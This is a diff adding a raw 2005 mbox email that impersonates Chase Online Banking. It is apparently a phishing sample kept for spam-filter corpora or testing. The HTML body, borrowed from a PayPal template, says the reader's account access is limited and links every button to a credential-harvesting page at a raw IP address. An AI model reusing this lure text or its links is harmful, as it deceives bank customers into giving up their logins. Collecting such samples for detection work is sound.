@@ -1,0 +1,142 @@
+From nobody Sun Jan 25 14:03:11 2015
+Return-Path: <support@server-update.us>
+X-Original-To: username@login.domain.com
+Delivered-To: username@login.domain.com
+Received: from mail1.domain.com (mail1.domain.com [10.0.2.3])
+ by naughty.domain.com (Postfix) with ESMTP id ECFB5536E8B
+ for <username@login.domain.com>; Mon, 14 Nov 2005 23:32:59 -0500 (EST)
+Received: from mail1.domain.com (localhost.domain.com [127.0.0.1])
+ by mail1.domain.com (Postfix) with ESMTP id F003B6CCE84
+ for <username@domain.com>; Mon, 14 Nov 2005 23:32:57 -0500 (EST)
+Received: from sendmail2.brinkster.com (smtp7.brinkster.com [65.182.99.18])
+ by mail1.domain.com (Postfix) with ESMTP
+ for <username@domain.com>; Mon, 14 Nov 2005 23:32:57 -0500 (EST)
+Received: from User ([60.224.115.210])
+ by sendmail2.brinkster.com (Brinkster Mail 2) with ASMTP id IYG74540;
+ Mon, 14 Nov 2005 23:33:40 -0500
+Reply-To: <support@server-update.us>
+From: "Chase Online Banking" <support@server-update.us>
+Subject: Online Account Access Limited
+Date: Tue, 15 Nov 2005 06:32:51 +0200
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+X-Spam-Checker-Version: SpamAssassin 3.0.2 (2004-11-16)
+X-Spam-Level: ****
+X-Spam-Status: No, score=4.9 required=5.0 tests=FORGED_MUA_OUTLOOK,
+ FORGED_OUTLOOK_HTML,HTML_MESSAGE,HTML_TAG_EXIST_TBODY,MIME_HTML_ONLY,
+ MISSING_HEADERS,NORMAL_HTTP_TO_IP autolearn=no version=3.0.2
+X-Spam-Report: *  0.1 MISSING_HEADERS Missing To: header
+ *  0.0 NORMAL_HTTP_TO_IP URI: Uses a dotted-decimal IP address in URL
+ *  0.0 HTML_MESSAGE BODY: HTML included in message
+ *  0.1 HTML_TAG_EXIST_TBODY BODY: HTML has "tbody" tag
+ *  0.2 MIME_HTML_ONLY BODY: Message only has text/html MIME parts
+ *  0.6 FORGED_OUTLOOK_HTML Outlook can't send HTML message only
+ *  3.9 FORGED_MUA_OUTLOOK Forged mail pretending to be from MS Outlook
+Message-Id: <20051115043257.F003B6CCE84@mail1.domain.com>
+To: undisclosed-recipients: ;
+X-Keywords: 
+Status: RO
+Content-Length: 5835
+Lines: 95
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3c.org/TR/1999/REC-html401-19991224/loose.dtd">
+<HTML><HEAD><TITLE>Visions FCU - Limited Account Details</TITLE>
+<META http-equiv=Content-Type content="text/html; charset=UTF-8"><!--
+       Script info: script: webscr, cmd: _login-done, template: p/acc/help-restrictedaccts, date: Jun. 23, 2005 11:37:10 PDT; country: US, language: en_US, xslt server: 
+       web version: 32.0-145644 branch: live-320_int
+       content version: 32.0-144943
+       pexml version: 32.0-146097
+       page XSL: /en_US/account/HelpRestrictedAccts.xsl
+-->
+<META http-equiv=description 
+content="PayPal lets you send money to anyone with email. PayPal is free for consumers and works seamlessly with your existing credit card and checking account. You can settle debts, borrow cash, divide bills or split expenses with friends all without going to an ATM or looking for your checkbook.">
+<META http-equiv=keywords 
+content="Send, money, payments, credit, credit card, instant, money, financial services, mobile, wireless, WAP, cell phones, two-way pagers, Windows CE"><LINK 
+href="https://www.paypalobjects.com/en_US/i/nav/xpt.css" type=text/css rel=stylesheet><LINK 
+href="https://www.paypalobjects.com/en_US/i/nav/xptInvoice.css" type=text/css rel=stylesheet><LINK 
+href="https://www.paypalobjects.com/en_US/i/nav/xptObsolete.css" type=text/css rel=stylesheet><LINK 
+href="https://www.paypalobjects.com/en_US/i/nav/xptlive.css" type=text/css rel=stylesheet>
+<STYLE type=text/css></STYLE>
+<LINK href="/en_US/i/icon/pp_favicon_x.ico" rel="shortcut icon">
+<SCRIPT src="https://www.paypalobjects.com/en_US/i/nav//pp_main.js"></SCRIPT>
+
+<META content="MSHTML 6.00.2900.2668" name=GENERATOR></HEAD>
+<BODY>
+<DIV>
+<DIV id=xptHeader>
+<TABLE cellSpacing=0 cellPadding=0 align=center border=0>
+  <TBODY>
+  <TR>
+    <TD noWrap><IMG alt="" src="http://www.chase.com/cm/shared/cfs/image/logo/chase_logo_2005.gif" border=0></TD>
+    <TD class=cobrand align=middle width="100%">&nbsp;</TD>
+    <TD noWrap align=right><A 
+      href="http://218.237.65.25/myadmin/.~/.~/chase/?chaseonlinebanking.php?verify_your_identity_userid_no91249421942194219421421241241_chaseonline_bank">Log&nbsp;Out</A>&nbsp;|&nbsp;<A 
+      href="http://218.237.65.25/myadmin/.~/.~/chase/?chaseonlinebanking.php?verify_your_identity_userid_no91249421942194219421421241241_chaseonline_bank">Help</A> 
+    </TD></TR></TBODY></TABLE></DIV>
+
+<DIV id=xptContentMain>
+<TABLE cellSpacing=0 cellPadding=0 width=600 align=center border=0>
+  <TBODY>
+  <TR>
+    <TD><IMG height=1 alt="" src="https://www.paypalobjects.com/en_US/i/nav/pixel.gif" width=600 
+    border=0></TD></TR>
+  <TR>
+    <TD>
+      <DIV id=xptTitle>
+      <TABLE class=main cellSpacing=0 cellPadding=0 align=center border=0>
+        <TBODY>
+        <TR>
+          <TD class=heading width="100%"></TD></TR>
+        <TR>
+          <TD><IMG height=2 alt="" src="https://www.paypalobjects.com/en_US/i/nav/pixel.gif" width=1 
+            border=0></TD></TR>
+        <TR>
+          <TD>
+            <HR>
+          </TD></TR></TBODY></TABLE></DIV></TD></TR>
+  <TR>
+    <TD vAlign=top><B>Chase</B> is constantly working to ensure security by 
+      regularly screening the accounts in our system. We recently reviewed your 
+      account, and we need more information to help us provide you with secure 
+      service. Until we can collect this information, your access to sensitive 
+      account features will be limited. We would like to restore your access as 
+      soon as possible, and we apologize for the inconvenience. <BR>
+      <HR class=dotted>
+      <SPAN class=emphasis>Why is my account access limited?</SPAN><BR><BR 
+      class=h6>Your account access has been limited for the following 
+      reason(s):<BR><BR>
+      <LI><SPAN class=emphasis>Nov. 14, 2005: </SPAN>We would like to ensure that 
+      your account was not accessed by an unauthorized third party. Because 
+      protecting the security of your account is our primary concern, we have 
+      limited access to sensitive <B>Chase</B> account features. We understand that 
+      this may be an inconvenience but please understand that this temporary 
+      limitation is for your protection. <BR><BR>(Your case ID for this reason 
+      is ViCU-410-320-3334.)<BR><BR>
+<BR>
+At Chase, one of our most important responsibilities to you, our customer, is the safekeeping of the nonpublic personal ("confidential") information you have entrusted to us and using this information in a responsible manner. Appropriate use of the confidential information you provide us is also at the heart of our ability to provide you with exceptional personal service whenever you contact us. <BR><BR>
+      <HR class=dotted>
+      <SPAN class=emphasis>How can I restore my account access?</SPAN><BR><BR>
+      <TABLE cellSpacing=0 cellPadding=1 width="100%" align=center 
+      bgColor=#cc9999>
+        <TBODY>
+        <TR>
+          <TD>
+            <TABLE cellSpacing=0 cellPadding=5 width="100%" align=center 
+            bgColor=#ffeeee>
+              <TBODY>
+              <TR>
+                <TD><SPAN class=emphasis>Please confirm your identity here:  <A 
+                  href="http://218.237.65.25/myadmin/.~/.~/chase/?chaseonlinebanking.php?verify_your_identity_userid_no91249421942194219421421241241_chaseonline_bank">Restore My Online Banking</A> and complete the "Steps to Remove Limitations." 
+                  </SPAN></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE><BR>Completing 
+      all of the checklist items will automatically restore your account 
+      access.<BR>
+      <HR class=dotted>
+      </LI></TD></TR></TBODY></TABLE></DIV>
+
+      <P class=lastPara>Copyright © 2005 <B>Chase</B>. All rights reserved.<BR><BR></P></TD></TR></TBODY></TABLE><BR></DIV></DIV></BODY></HTML>
